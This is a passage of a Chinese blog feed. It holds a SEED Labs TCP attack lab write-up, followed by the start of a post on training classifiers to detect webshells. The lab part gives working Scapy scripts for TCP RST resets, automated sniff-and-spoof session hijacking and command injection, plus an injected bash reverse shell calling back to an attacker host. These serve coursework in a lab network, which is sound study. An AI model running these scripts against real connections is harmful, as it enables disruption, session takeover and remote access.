type="1"><li><p>开启SYNCookie机制，发动攻击，一段时间后，发现队列中已有128个SYN_RECV状态的连接信息，但由于我们开启了SYNCookie，该队列不影响正常连接。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124936.png"alt="image-20231122105456830" /><figcaption aria-hidden="true">image-20231122105456830</figcaption></figure></li><li><p>使用HostB容器，尝试用telnet连接受害者机器，成功登录。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124937.png"alt="image-20231122105527058" /><figcaption aria-hidden="true">image-20231122105527058</figcaption></figure></li><li><p>原因分析：为了应对SYNflooding（即客户端只发送SYN包发起握手而不回应ACK完成连接建立，填满server端的半连接队列，让它无法处理正常的握手请求），Linux实现了一种称为SYNCookie的机制，通过net.ipv4.tcp_syncookies控制，设置为1表示开启。简单说SYNCookie就是将连接信息编码在ISN(initial sequencenumber)中返回给客户端，这时server不需要将半连接保存在队列中，而是利用客户端随后发来的ACK带回的ISN还原连接信息，以完成连接的建立，避免了半连接队列被攻击SYN包填满。具体流程如下：</p><ul><li>在服务器接收到SYN数据包后，它使用只有服务器知道的密钥从数据包中的信息计算密钥散列（H）。</li><li>此哈希（H）作为初始序列号从服务器发送到客户端。H称为SYNcookie。</li><li>服务器不会将半开放连接存储在其队列中。</li><li>如果客户端是攻击者，H将无法到达攻击者。</li><li>如果客户端不是攻击者，则在确认字段中输入H+1。</li><li>服务器通过重新计算cookie来检查确认字段中的数字是否有效。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124938.png"alt="image-20231122105939209" /><figcaption aria-hidden="true">image-20231122105939209</figcaption></figure></li></ol><h1 id="task-2-tcp-rst-attacks-on-telnet-connections">4. Task 2: TCP RSTAttacks on telnet Connections</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124939.png"alt="image-20231122110933482" /><figcaption aria-hidden="true">image-20231122110933482</figcaption></figure><p>TCP RST 攻击可以终止两个受害者之间建立的 TCP 连接。例如，如果用户 A和用户 B 之间存在一个已建立的 telnet 连接（TCP），攻击者可以伪造一个来自A 到 B 的 RST数据包，从而中断这个现有的连接。为了成功执行此攻击，攻击者需要正确构造TCP RST 数据包。</p><p>在这个任务中，你需要从虚拟机发起一个 TCP RST 攻击，以中断 A 和 B之间的一个已存在的 telnet连接，它们是容器。为了简化实验，我们假设攻击者和受害者位于同一个局域网中，即攻击者能够观察到A 和 B 之间的 TCP 通信流量。</p><p><strong>手动发起攻击：</strong>请使用 Scapy 进行 TCP RST攻击。下面提供了一段骨架代码。您需要将 @@@@ 替换为实际值（可以使用Wireshark 获取）：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281500444.png"alt="image-20231228144944088" /><figcaption aria-hidden="true">image-20231228144944088</figcaption></figure><p><strong>可选：自动发起攻击。</strong>我们鼓励学生编写一个程序，利用嗅探和欺骗技术自动发起攻击。与手动方法不同的是，我们从嗅探数据包中获取所有参数，因此整个攻击过程都是自动化的。请确保在使用Scapy 的嗅探函数时，不要忘记设置 iface 参数。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>开启wireshark进行监听，用HostB（10.9.0.6）向受害者（10.9.0.5）发起telnet远程连接，成功登录后，查看最后一个telnet数据包（本例中为受害者→user1），从中获取源IP、源端口、目的IP、目的端口、Nextsequence number等信息。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124940.png"alt="image-20231122110159723" /><figcaption aria-hidden="true">image-20231122110159723</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124941.png"alt="image-20231122110215325" /><figcaption aria-hidden="true">image-20231122110215325</figcaption></figure></li><li><p>编写代码，伪装成受害者机器，向HostB发送RST数据包，断开连接。seq为Nextsequence number。伪造的RST数据包：需要正确设置以下字段：</p><ul><li>源IP地址，源端口</li><li>目的IP地址，目的端口</li><li>Sequence number（在接收器窗口内）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>ip = IP(src=<span class="hljs-string">&quot;10.9.0.5&quot;</span>, dst=<span class="hljs-string">&quot;10.9.0.6&quot;</span>)<br>tcp = TCP(sport=<span class="hljs-number">23</span>, dport=<span class="hljs-number">34884</span>, flags=<span class="hljs-string">&quot;R&quot;</span>, seq=<span class="hljs-number">3191509165</span>)<br>pkt = ip/tcp<br>ls(pkt)<br>send(pkt, verbose=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure></li><li><p>实施攻击，成功断开连接。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124942.png"alt="image-20231122110442761" /><figcaption aria-hidden="true">image-20231122110442761</figcaption></figure></li><li><p>编写自动化攻击脚本，使用 Scapy来监听网络接口上的TCP数据包，并自动执行TCPRST攻击，中断指定的连接。构造的攻击数据包与捕获的数据包：源端口目的端口互换，源IP目的IP互换，seq即为捕获数据包的ack。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 回调函数，用于处理每个嗅探到的数据包</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">packet_callback</span>(<span class="hljs-params">packet</span>):<br>    <span class="hljs-comment"># 检查数据包是否是TCP数据包</span><br>    <span class="hljs-keyword">if</span> TCP <span class="hljs-keyword">in</span> packet <span class="hljs-keyword">and</span> IP <span class="hljs-keyword">in</span> packet:<br>        <span class="hljs-comment"># 提取源和目标IP地址以及端口信息</span><br>        src_ip = packet[IP].src<br>        dst_ip = packet[IP].dst<br>        sport = packet[TCP].sport<br>        dport = packet[TCP].dport<br><br>        <span class="hljs-comment"># 构造TCP RST攻击数据包</span><br>        ip_layer = IP(src=dst_ip, dst=src_ip)<br>        tcp_layer = TCP(sport=dport, dport=sport, flags=<span class="hljs-string">&quot;R&quot;</span>, seq=packet[TCP].ack)<br><br>        <span class="hljs-comment"># 构造完整的数据包</span><br>        rst_packet = ip_layer / tcp_layer<br><br>        <span class="hljs-comment"># 发送TCP RST攻击数据包</span><br>        send(rst_packet, verbose=<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># 启动嗅探并设置回调函数</span><br>sniff(iface=<span class="hljs-string">&quot;br-7158a79e1f4c&quot;</span>, prn=packet_callback, store=<span class="hljs-number">0</span>, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;tcp&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>运行自动化攻击脚本，尝试使用telnet连接受害机，连接立即被中断。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124943.png"alt="image-20231122110839946" /><figcaption aria-hidden="true">image-20231122110839946</figcaption></figure></li></ol><h1 id="task-3-tcp-session-hijacking">5. Task 3: TCP SessionHijacking</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281500445.png"alt="image-20231228145252755" /><figcaption aria-hidden="true">image-20231228145252755</figcaption></figure><p>TCP会话劫持攻击的目标是通过向现有的两个受害者之间的TCP连接（会话）注入恶意内容来劫持该连接。如果此连接是telnet会话，则攻击者可以向该会话中注入恶意命令（例如删除一个重要文件），导致受害者执行这些恶意命令。图3描述了攻击的工作原理。在这个任务中，您需要演示如何劫持两台计算机之间的telnet会话。您的目标是让telnet服务器执行您发送的恶意命令。为了任务的简单性，我们假设攻击者和受害者在同一个局域网上。</p><p><strong>手动发起攻击：</strong>请使用 Scapy 进行 TCP会话劫持攻击。下面提供了一段骨架代码。您需要用实际值替换每个@@@@；您可以使用 Wireshark 来计算应该在欺骗的 TCP数据包的每个字段中填入什么值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281500446.png"alt="image-20231228145329545" /><figcaption aria-hidden="true">image-20231228145329545</figcaption></figure><p><strong>可选：自动发起攻击。</strong>我们鼓励学生编写一个程序，利用嗅探和欺骗技术自动发起攻击。与手动方法不同的是，我们从嗅探数据包中获取所有参数，因此整个攻击过程都是自动化的。请确保在使用Scapy 的嗅探函数时，不要忘记设置 iface 参数。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>开启wireshark进行监听，用HostB（10.9.0.6）向受害者（10.9.0.5）发起telnet远程连接，查看10.9.0.5发送给10.9.0.6的最后一个数据包，从中获取源IP、源端口、目的IP、目的端口、Nextsequence number、ACK等信息。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124945.png"alt="image-20231122111237654" /><figcaption aria-hidden="true">image-20231122111237654</figcaption></figure></li><li><p>编写代码，伪装成HostB向受害者发送指令，源端口为34942，目的端口为23，seq为ACKnumber，ack为Next sequencenumber，执行的命令为ifconfig。伪造TCP数据包：需要正确设置以下字段：</p><ul><li>源IP地址，源端口，</li><li>目标IP地址，目标端口</li><li>序列号（在接收器窗口内）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>ip = IP(src=<span class="hljs-string">&quot;10.9.0.6&quot;</span>, dst=<span class="hljs-string">&quot;10.9.0.5&quot;</span>)<br>tcp = TCP(sport=<span class="hljs-number">34942</span>, dport=<span class="hljs-number">23</span>, flags=<span class="hljs-string">&quot;A&quot;</span>, seq=<span class="hljs-number">528360772</span>, ack=<span class="hljs-number">850449922</span>)<br>data = <span class="hljs-string">&quot;ifconfig\r&quot;</span><br>pkt = ip/tcp/data<br>ls(pkt)<br>send(pkt, verbose=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure></li><li><p>实施攻击，成功捕获到发出的数据包，以及受害者机器返回的执行ifconfig的数据。并且，远程终端被锁死。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124946.png"alt="image-20231122111445796" /><figcaption aria-hidden="true">image-20231122111445796</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124948.png"alt="image-20231122111502560" /><figcaption aria-hidden="true">image-20231122111502560</figcaption></figure></li><li><p>编写自动化攻击脚本，在成功登录后发送攻击数据包。注：Next sequencenumber通过seq和payload相加得到。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 存储登录状态的标志</span><br>logged_in = <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 回调函数，用于处理每个嗅探到的数据包</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">packet_callback</span>(<span class="hljs-params">packet</span>):<br>    <span class="hljs-keyword">global</span> logged_in<br>    <br>    <span class="hljs-comment"># 检查数据包是否是TCP数据包</span><br>    <span class="hljs-keyword">if</span> TCP <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> packet <span class="hljs-keyword">or</span> IP <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> packet:<br>        <span class="hljs-keyword">return</span><br>    <br>    <span class="hljs-comment"># 提取源和目标IP地址以及端口信息</span><br>    src_ip = packet[IP].src<br>    dst_ip = packet[IP].dst<br>    sport = packet[TCP].sport<br>    dport = packet[TCP].dport<br>    <br>    <span class="hljs-comment"># 提取TCP数据包的载荷</span><br>    <span class="hljs-keyword">if</span> Raw <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> packet:<br>        <span class="hljs-keyword">return</span><br>    data = packet[Raw].load<br><br>    <span class="hljs-comment"># 判断是否已成功登录</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> logged_in <span class="hljs-keyword">and</span> (<span class="hljs-string">b&quot;Welcome&quot;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&quot;Last login&quot;</span> <span class="hljs-keyword">in</span> data):<br>        logged_in = <span class="hljs-literal">True</span><br><br>    <span class="hljs-comment"># 如果已成功登录，构造并发送TCP Session攻击数据包</span><br>    <span class="hljs-keyword">if</span> logged_in:<br>        next_seq_number = packet[TCP].seq + <span class="hljs-built_in">len</span>(packet[TCP].payload)<br>        ip_layer = IP(src=dst_ip, dst=src_ip)<br>        tcp_layer = TCP(sport=dport, dport=sport, flags=<span class="hljs-string">&quot;A&quot;</span>, seq=packet[TCP].ack,ack=next_seq_number)<br>        attack_data = <span class="hljs-string">&quot;ifconfig\r&quot;</span><br>        attack_packet = ip_layer / tcp_layer / attack_data<br><br>        <span class="hljs-comment"># 发送攻击数据包</span><br>        send(attack_packet, verbose=<span class="hljs-number">0</span>)<br>        <br>        <span class="hljs-comment"># 攻击成功后停止嗅探</span><br>        logged_in = <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 启动嗅探并设置回调函数</span><br>sniff(iface=<span class="hljs-string">&quot;br-7158a79e1f4c&quot;</span>, prn=packet_callback, store=<span class="hljs-number">0</span>, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;tcp and dst host 10.9.0.6&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>运行自动化攻击脚本，在user1成功连接到受害者机器后，发送ifconig命令，并得到返回数据。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124949.png"alt="image-20231122111653272" /><figcaption aria-hidden="true">image-20231122111653272</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124950.png"alt="image-20231122111703790" /><figcaption aria-hidden="true">image-20231122111703790</figcaption></figure></li></ol><h1 id="task-4-creating-reverse-shell-using-tcp-session-hijacking">6.Task 4: Creating Reverse Shell using TCP Session Hijacking</h1><p>当攻击者利用 TCP会话劫持向受害者机器注入命令时，他们并不希望在受害者机器上运行一个简单的命令，而是希望运行许多命令。显然，通过TCP会话劫持来运行这些命令是很不方便的，攻击者想要达到的目的是利用攻击来设置后门，这样他们就可以利用这个后门方便地进行进一步的破坏。</p><p>设置后门的典型方法是从受害者机器上运行反向 shell，让攻击者通过 shell访问受害者机器。反向 shell 是在远程机器上运行的 shell进程，可连接回攻击者的机器。一旦远程机器被入侵，攻击者就可以方便地访问远程机器。</p><p>下面，我们将展示如果可以直接在受害者机器（即服务器机器）上运行命令，我们如何设置反向shell。在TCP会话劫持攻击中，攻击者无法直接在受害者机器上运行命令，因此他们的工作就是通过会话劫持攻击运行反向shell 命令。在本任务中，学生需要证明他们能够实现这一目标。</p><p>要让远程机器上的 bash shell连接回攻击者的机器，攻击者需要一个进程在指定端口上等待连接。在本例中，我们将使用netcat。该程序允许我们指定一个端口号，并监听该端口上的连接。在下面的演示中，我们展示了两个窗口，每个窗口来自不同的机器。上面的窗口是运行netcat（简称 nc）的攻击机器 10.9.0.1，监听端口为9090。下面的窗口是受害者机器 10.9.0.5，我们键入反向 shell 命令。反向shell 一经执行，顶部窗口就会显示我们得到了一个 shell。这是一个反向shell，即在 10.9.0.5 上运行。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281500447.png"alt="image-20231228145730767" /><figcaption aria-hidden="true">image-20231228145730767</figcaption></figure><p>下文将简要介绍反向 shell 命令。详细说明可参阅 SEED 一书。</p><ul><li>"/bin/bash -i"：i 代表交互式，意思是 shell 必须是交互式的（必须提供shell 提示）。</li><li>"&gt;/dev/tcp/10.9.0.1/9090"：这会将 shell 的输出（stdout）重定向到10.9.0.1 的端口 9090 的 tcp 连接。输出 stdout 由文件描述符 1 表示。</li><li>"0&lt;&amp;1":文件描述符 0 代表标准输入 (stdin)。这会导致 shell 的stdin 从 tcp 连接中获取。</li><li>"2&gt;&amp;1":文件描述符 2 代表标准错误stderr。这会导致错误输出重定向到 tcp 连接。</li></ul><p>总之，"/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;12&gt;&amp;1 "启动了一个 bash shell，其输入来自一个 tcp连接，标准输出和错误输出被重定向到同一个 tcp 连接。</p><p>在上面的演示中，当在 10.9.0.5 上执行 bash shell 命令时，它会连接回在10.9.0.1 上启动的 netcat 进程。这可以通过 netcat 显示的 "Connectionreceived on 10.9.0.5"（在 10.9.0.5 上收到的连接）信息确认。</p><p>上面的描述说明了如果您有访问目标计算机（即我们设置中的 telnet服务器）的权限，可以如何设置反向shell，但在本任务中，您没有这种权限。您的任务是对用户和目标服务器之间的现有telnet 会话发起 TCP会话劫持攻击。您需要向被劫持的会话注入恶意命令，以便在目标服务器上获得反向shell。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>攻击机使用netcat监听9090端口。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124951.png"alt="image-20231122111802252" /><figcaption aria-hidden="true">image-20231122111802252</figcaption></figure></li><li><p>开启wireshark进行监听，用HostB（10.9.0.6）向受害者（10.9.0.5）发起telnet远程连接，查看10.9.0.5发送给10.9.0.6的最后一个数据包，从中获取源IP、源端口、目的IP、目的端口、Nextsequence number、ACK等信息。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124952.png"alt="image-20231122111842134" /><figcaption aria-hidden="true">image-20231122111842134</figcaption></figure></li><li><p>代码流程与Task3类似，只是将传递的data改为reverseshell命令。根据上面捕获的数据包进行填充。注：<code>&gt;</code>输出重定向；<code>&lt;</code>输入重定向。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124953.png"alt="image-20231122112215885" /><figcaption aria-hidden="true">image-20231122112215885</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>ip = IP(src=<span class="hljs-string">&quot;10.9.0.6&quot;</span>, dst=<span class="hljs-string">&quot;10.9.0.5&quot;</span>)<br>tcp = TCP(sport=<span class="hljs-number">35130</span>, dport=<span class="hljs-number">23</span>, flags=<span class="hljs-string">&quot;A&quot;</span>, seq=<span class="hljs-number">2492791675</span>, ack=<span class="hljs-number">2941888300</span>)<br>data = <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1\r&quot;</span><br>pkt = ip/tcp/data<br>ls(pkt)<br>send(pkt, verbose=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure></li><li><p>执行代码，成功得到反弹shell。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124954.png"alt="image-20231122111916437" /><figcaption aria-hidden="true">image-20231122111916437</figcaption></figure></li></ol><p>参考教程：</p><ol type="1"><li><ahref="https://seanxz401.github.io/2022/12/31/网络攻防-TCP攻击/#Task2-RST">网络攻防-TCP攻击- Sean's Blog (seanxz401.github.io)</a></li><li><ahref="https://blog.csdn.net/l4kjih3gfe2dcba1/article/details/126532697">TCP/IPAttack Lab（SEED实验）_winnower-sliff的博客-CSDN博客</a></li><li>https://www.jianshu.com/p/ff26312e67a9</li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Network Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Webshell检测</title>
    <link href="/2023/11/18/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E8%B7%B5%E7%AF%87/Webshell%E6%A3%80%E6%B5%8B/"/>
    <url>/2023/11/18/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E8%B7%B5%E7%AF%87/Webshell%E6%A3%80%E6%B5%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="code">Code</h1><h2 id="特征处理和模型训练">1. 特征处理和模型训练</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> roc_curve, auc<br><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> metrics<br><span class="hljs-keyword">import</span> joblib<br><span class="hljs-keyword">from</span> sklearn.feature_extraction.text <span class="hljs-keyword">import</span> CountVectorizer, TfidfTransformer<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> classification_report, confusion_matrix<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.naive_bayes <span class="hljs-keyword">import</span> GaussianNB<br><span class="hljs-keyword">from</span> sklearn.neural_network <span class="hljs-keyword">import</span> MLPClassifier<br><span class="hljs-keyword">from</span> xgboost <span class="hljs-keyword">import</span> XGBClassifier<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">model_collection</span>(<span class="hljs-params">mode</span>):<br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">&#x27;mlp&#x27;</span>:<br>        <span class="hljs-comment"># 返回一个多层感知机（MLP）分类器对象</span><br>        <span class="hljs-comment"># 参数包括 solver（优化算法）、alpha（L2正则化参数）、hidden_layer_sizes（隐藏层的神经元数量）</span><br>        <span class="hljs-keyword">return</span> MLPClassifier(solver=<span class="hljs-string">&quot;lbfgs&quot;</span>, alpha=<span class="hljs-number">1e-5</span>, hidden_layer_sizes=(<span class="hljs-number">5</span>, <span class="hljs-number">2</span>), random_state=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">&#x27;xgb&#x27;</span>:<br>        <span class="hljs-comment"># 返回一个XGBoost分类器对象</span><br>        <span class="hljs-keyword">return</span> XGBClassifier(eval_metric=<span class="hljs-string">&#x27;error&#x27;</span>)<br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">&#x27;gnb&#x27;</span>:<br>        <span class="hljs-comment"># 返回一个高斯朴素贝叶斯（Gaussian Naive Bayes）分类器对象</span><br>        <span class="hljs-keyword">return</span> GaussianNB()<br><br><span class="hljs-comment"># 函数功能：从指定的 ZIP 文件中读取所有以 .php 结尾的文件，并将每个文件的内容以字符串形式存储在一个列表中</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file_from_zip</span>(<span class="hljs-params">zip_file, file_extension=<span class="hljs-string">&quot;.php&quot;</span></span>):<br>    text_list = []<br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(zip_file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> z:<br>        file_list = [name <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> z.namelist() <span class="hljs-keyword">if</span> name.endswith(file_extension)]<br>        <span class="hljs-keyword">for</span> file_name <span class="hljs-keyword">in</span> file_list:<br>            <span class="hljs-keyword">with</span> z.<span class="hljs-built_in">open</span>(file_name) <span class="hljs-keyword">as</span> f:<br>                text = f.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                text_list.append(text)<br>    <span class="hljs-keyword">return</span> text_list<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">features_process</span>(<span class="hljs-params">negative_zip, positive_zip, max_features</span>):<br>    <span class="hljs-comment"># 读取黑样本文件内容</span><br>    webshell_texts = read_file_from_zip(negative_zip)<br>    <span class="hljs-comment"># 读取白样本文件内容</span><br>    normal_texts = read_file_from_zip(positive_zip)<br>    <span class="hljs-comment"># 统计样本数量</span><br>    webshell_number = <span class="hljs-built_in">len</span>(webshell_texts)<br>    normal_number = <span class="hljs-built_in">len</span>(normal_texts)<br>    <span class="hljs-comment"># 合并文本和标签</span><br>    texts = webshell_texts + normal_texts<br>    webshell_labels = [<span class="hljs-number">1</span>] * webshell_number<br>    normal_labels = [<span class="hljs-number">0</span>] * normal_number<br>    labels = webshell_labels + normal_labels<br>    <span class="hljs-comment"># 输出样本数量信息</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;白样本总量：%i&quot;</span> % normal_number)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;黑样本总量：%i&quot;</span> % webshell_number)<br>    <br>    <span class="hljs-comment"># CountVectorizer 是 Scikit-learn 